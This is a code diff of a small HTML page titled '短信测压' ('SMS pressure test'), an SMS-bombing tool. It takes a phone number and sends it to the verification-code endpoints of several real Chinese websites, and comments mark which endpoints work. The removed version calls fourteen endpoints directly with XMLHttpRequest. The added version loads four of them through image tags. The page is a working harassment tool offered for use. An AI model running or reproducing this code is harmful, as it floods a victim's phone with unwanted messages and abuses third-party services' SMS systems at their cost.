@@ -1,6 +1,11 @@
 <html style="background: #202124;">
  <head>
   <style>
+          @media screen and (prefers-color-scheme: light) {
+              html{	filter: invert(100%);
+}
+      }
+
       button {
   position: relative;
   transition-duration: 0.4s;
@@ -36,64 +41,19 @@ box-shadow: inset 0px -1px #666,0px 1px #666;
   <title>《短信测压》</title> 
   <script>
 function fire() {
-    var name = document.getElementById("uid").value;
-    //1 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://gl.gdedu.gov.cn/api-service/captcha?phoneNumber=' + name + '&captchaType=QUERY_ADMIN', true);
-    httpRequesta.send();
-    //2
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'http://id.lejiaolexue.com/api/sendvericode.ashx?phone=' + name, true);
-    httpRequesta.send();
-    //3 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'http://api.welove520.com/v5/account/phone/verifyCode/send?phone_number=' + name + '&client_id=464847866_&type=6&area_code=86&app_key=ac5f34563a4344c4&sig=xvP64W04tR%2FNJoZEJEoJySmlIXU%3D', true);
-    httpRequesta.send();
-    //4
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://uc.csdhe.com/v1/sms/send?mobile=' + name + '&apptype=examWeb', true);
-    httpRequesta.send();
-    //5 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone=' + name + '&type=login', true);
-    httpRequesta.send();
-    //6
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://mallapi.yofogo.com/biz-mall-application/v1/user/verifyCode/getVerifyCode?phone=' + name + '&descriptionType=1&codeType=2', true);
-    httpRequesta.send();
-    //7 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://mall.yancais.com/api/sms/send?phone=' + name, true);
-    httpRequesta.send();
-    //8
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://www.yojiang.cn/api/user/send_verify_code?phone=' + name, true);
-    httpRequesta.send();
-    //9
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=' + name + '&mbid=197873&check=3', true);
-    httpRequesta.send();
-    //10 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://www.phone580.com/fzsuserapi/user/sendsmscode?phonenum=' + name + '&modelid=16&templateid=42&key=&validCode=', true);
-    httpRequesta.send();
-    //11 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://www.189.cn/dqmh/uamGetCheckCodeAction.do?method=getSMSDynamicCode&phoneNumber=' + name + '%20&ikl=1', true);
-    httpRequesta.send();
-    //12 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://www.airparking.cn/h5app/sms/signup?mobile=' + name, true);
-    httpRequesta.send();
-    //13 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile=' + name, true);
-    httpRequesta.send();
-    //14 ok
-    var httpRequesta = new XMLHttpRequest();
-    httpRequesta.open('GET', 'https://www.dehua.net/include/ajax.php?service=siteConfig&action=getphoneVerify&type=signup&phone=' + name + '&areaCode=86', true);
-    httpRequesta.send();
-};
+        var name = document.getElementById("uid").value;
+    
+    
+    
+    jiekou=["https://gl.gdedu.gov.cn/api-service/captcha?phoneNumber={phone_number}&captchaType=QUERY_ADMIN","http://id.lejiaolexue.com/api/sendvericode.ashx?phone={phone_number}","http://api.welove520.com/v5/account/phone/verifyCode/send?phone_number={phone_number}&client_id=464847866_&type=6&area_code=86&app_key=ac5f34563a4344c4&sig=xvP64W04tR%2FNJoZEJEoJySmlIXU%3D","https://uc.csdhe.com/v1/sms/send?mobile={phone_number}&apptype=examWeb"];
+for (var i=0;i<jiekou.length;i++){
+    jiekoua = jiekou[i].replace(/{phone_number}/, name)
+    document.getElementById("d1").innerHTML="<img src='"+jiekoua+"'>";}
+
+
+}
+      
+
     </script> 
  </head>
  <body>
@@ -111,5 +71,7 @@ function fire() {
    <button style="width: 100%;height: 30px;background: #333;color: grey;margin-top:30px;border: none;" onclick="fire()">Fire!</button> 
   </div> 
   <p style="text-align: center;color:#555;font-family: sans-serif;left: 0px;right: 0px; bottom: 0px;position: fixed">由Hirgen在WTFPL许可证下制作～</p>  
+     <div id="d1"></div>
+
  </body>
 </html>
